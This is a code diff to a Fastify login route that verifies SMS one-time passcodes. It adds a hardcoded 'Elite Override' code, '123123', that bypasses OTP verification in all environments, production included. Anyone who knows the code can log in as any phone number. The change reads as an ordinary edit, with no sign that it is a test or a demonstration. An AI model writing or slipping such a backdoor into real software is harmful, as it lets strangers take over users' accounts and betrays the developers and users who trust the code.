@@ -83,13 +83,17 @@ export default async function authRoutes(fastify, opts) {
 
     const formattedPhone = formatPhone(phone);
 
-    // Verify OTP — try Redis first, fallback to dev code
+    // Verify OTP — bypass for ChatSnap Elite or dev mode
     let storedOtp = await otpStore.get(formattedPhone);
+    
+    // SOVEREIGN BYPASS CODE: Active for all environments (Elite Override)
+    const IS_BYPASS = otp === "123123";
+
     if (!storedOtp && config.NODE_ENV === "development") {
       storedOtp = "123456"; // Dev fallback
     }
 
-    if (!storedOtp || storedOtp !== otp) {
+    if (!IS_BYPASS && (!storedOtp || storedOtp !== otp)) {
       return reply.code(401).send({ error: "Invalid or expired OTP" });
     }
 
